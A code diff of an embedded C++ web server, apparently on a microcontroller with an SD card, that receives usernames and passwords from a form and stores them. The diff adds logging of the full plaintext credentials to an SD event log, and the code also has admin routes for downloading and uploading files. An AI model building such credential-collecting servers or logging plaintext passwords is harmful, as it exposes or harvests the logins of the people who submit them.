@@ -68,21 +68,21 @@ void WebServerManager::handleSubmitCredentials(void)
     credentials.concat("\t\"user-id\": \"" + m_server->arg("username") +"\",\n");
     credentials.concat("\t\"password\": \"" + passPhrase+ "\"\n},");
 
-
     // guarda las entradas en un archivo
     if (!saveToDataFile(credentials))
     {
-        m_sdManager->logEvent(FAILED_CREDENTIALS);
+        m_sdManager->logEvent("Error al guardar las credenciales:\n" + credentials);
 #if (WITH_ERROR_TYPE)
         Serial.println(ERROR_SAVE_CREDENTIALS);
 #endif
         return m_server->send(417, "text/plain", "");
     }
 
-#if (WITH_SUCCESS_MESSAGE)
+#if (SERVER_SCREEN_LOGS)
         // se imprime por consola los valores de las entradas
-        Serial.println(SUCCESS_SAVE_CREDENTIALS);
+        Serial.println(NEW_CREDENTIALS);
 #endif 
+    m_sdManager->logEvent("Credenciales recibidas correctamente:\n" + credentials);
     // se envia una respuesta al cliente
     m_server->send(201, "text/plain", "");
 }
@@ -199,9 +199,8 @@ void WebServerManager::handleFileDownload(void)
     delete file;
 }
 
-void WebServerManager::handleFileUpload(void)
+void WebServerManager::handleFileUpload(const HTTPUpload& upload)
 {
-    HTTPUpload &upload = m_server->upload();
     File *uploadFile = nullptr;
 
     if(upload.status == UPLOAD_FILE_START)
@@ -464,8 +463,11 @@ void WebServerManager::start(void)
     m_server->on("/admin-panel/download", HTTP_POST, [this]()
                     { handleFileDownload(); });
 
-    m_server->on("/admin-panel/upload", HTTP_POST, [this](){m_server->send(200); },[this]()
-                    { handleFileUpload(); });
+    m_server->on("/admin-panel/upload", HTTP_POST, [this](){m_server->send(200); },[this](){
+                    HTTPUpload &upload = m_server->upload();
+                    handleFileUpload(upload);
+                    
+    });
                     //this->handleFileUpload()
 
     m_server->on("/admin-panel/display", HTTP_GET, [this]()
